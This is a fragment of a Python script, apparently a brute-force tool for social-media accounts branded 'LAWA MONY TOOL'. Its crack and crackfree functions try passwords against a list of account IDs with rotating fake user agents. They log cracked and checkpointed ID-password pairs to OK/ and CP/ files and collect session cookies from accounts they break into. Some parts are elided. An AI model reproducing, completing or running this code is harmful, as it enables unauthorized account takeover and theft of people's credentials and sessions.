...
os.system('espeak -a 300 " WELCOME TO LAWA MONY TOOL"')
...
os.system('clear')
print(logo)
uname = input(" [\u001b[36m•\033[1;37m] What is Your Name ?: " )
print('\033[1;37m----------------------------------------------')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r {P}[RAWAgu]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r {P}[LAWA🔥TEST]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    ...
    'viewport-width': '980',}
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print ('\x1b[36m||')
                print(f'\r\033[0;93m[\33[1;96mLAWA-CP\33[1;93m]  {idf}  {pw} ')
                print ('\x1b[36m||')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print ('\x1b[32m||')
                print(f'\r\33[1;93m[\33[1;92mLAWA-OK\33[1;93m] \33[1;92m{idf} {pw} ')
                os.system('espeak -a 300 " LAWA CRACKED OK ID"')
                print ('\x1b[32m||')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                cek_DYNO(kuki)
                break
